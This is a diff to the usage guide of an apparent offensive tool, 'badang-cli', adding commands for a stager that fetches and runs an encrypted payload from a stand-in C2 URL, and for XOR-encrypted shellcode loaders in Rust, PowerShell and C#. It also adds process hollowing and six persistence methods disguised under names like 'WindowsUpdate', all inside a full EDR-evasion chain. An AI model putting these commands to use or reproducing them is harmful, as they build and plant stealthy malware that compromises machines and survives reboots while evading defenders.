@@ -108,9 +108,25 @@ badang-cli generate --type reverse_tcp --lhost 192.168.1.10 --lport 4444 -o rev.
 
 # Bind shell
 badang-cli generate --type bind_tcp --lport 4444 -o bind.bin
+
+# Stager — download encrypted payload from URL, decrypt, execute
+badang-cli generate --type stager --url https://c2.example.com/p.bin --stager-key "s3cret" -o stager.bin
 ```
 
 All payloads use PEB walking (`gs:[0x60]` to find kernel32) and ROR13 API hashing — no hardcoded addresses.
+
+### Package as source code
+
+Wrap generated shellcode into compilable source templates:
+
+```bash
+badang-cli generate --type exec --command calc.exe --package exe -o runner.rs
+badang-cli generate --type reverse_tcp --lhost 10.0.0.1 --lport 4444 --package ps1 -o loader.ps1
+badang-cli generate --type exec --command calc.exe --package csharp -o runner.cs
+badang-cli generate --type exec --command calc.exe --package dll -o lib.rs
+```
+
+Each template embeds XOR-encrypted payload with runtime decryption. Formats: `exe` (Rust), `ps1` (PowerShell), `csharp` (C#), `dll` (Rust cdylib).
 
 You can also use external payloads. Verify them first:
 
@@ -223,6 +239,7 @@ Now you have an encrypted payload, blinded telemetry, and clean (or bypassed) AP
 | `section` | EDR monitors WriteProcessMemory | Yes |
 | `callback` | Need to avoid all thread creation APIs | No |
 | `stomp` | Need shellcode in a signed module's memory | No |
+| `hollowing` | Full PE replacement in a suspended process | No |
 
 ### Run the injection
 
@@ -247,6 +264,9 @@ badang-cli inject --technique callback --payload encrypted.bin -x -c
 
 # Module stomp — shellcode hides in a signed DLL
 badang-cli inject --technique stomp --payload encrypted.bin -x -c
+
+# Process hollowing — full PE replacement
+badang-cli inject --technique hollowing --payload pe_payload.exe -x -c
 ```
 
 Each technique logs its progress step by step, so you can see exactly what's happening.
@@ -316,6 +336,34 @@ The `syscall` instruction executes from ntdll's own code section, so EDR checks 
 
 ---
 
+## 11. Persistence
+
+After gaining execution, configure persistence to survive reboots.
+
+```bash
+# Registry Run key — executes at logon
+badang-cli persist --method registry --name "UpdateService" --payload runner.exe -x -c
+
+# Scheduled task — ONLOGON trigger
+badang-cli persist --method schtask --name "SystemCheck" --payload runner.exe -x -c
+
+# Windows service — auto-start
+badang-cli persist --method service --name "WindowsUpdate" --payload svc.exe -x -c
+
+# DLL search order placement
+badang-cli persist --method hijack --name version.dll --target "C:\Program Files\App" --payload ver.dll -x -c
+
+# COM component registration
+badang-cli persist --method com --target "{CLSID}" --payload server.dll -x -c
+
+# WMI event subscription
+badang-cli persist --method wmi --name "SystemEvent" --payload runner.exe -x -c
+```
+
+Six methods: `registry`, `schtask`, `wmi`, `hijack`, `com`, `service`. All use dynamic ADVAPI32 API resolution.
+
+---
+
 ## Full Operation Example
 
 Putting it all together — a complete evasion chain:
@@ -348,6 +396,9 @@ badang-cli inject --technique earlybird --payload encrypted.bin -x -c
 #    Process tree looks normal (spawned by PPID-spoofed parent)
 #    Memory encrypted during sleep (sleep obfuscation)
 #    Call stacks show ntdll/kernel32 (stack spoofing)
+
+# 8. Set up persistence
+badang-cli persist --method registry --name "UpdateService" --payload encrypted.bin -x -c
 ```
 
 ---
@@ -364,6 +415,7 @@ The GUI (`badang.exe`) provides the same capabilities with a visual interface:
 6. **Restore** tab — restore modified APIs
 7. **Syscall** tab — direct or indirect syscall invocation
 8. **Stack / Sleep** tabs — runtime evasion demos
+9. **Persist** tab — select persistence method, configure, execute
 
 The top bar shows the current mode (Dry Run / Live) and the Confirm checkbox. The log panel at the bottom shows all output with color-coded severity.
 
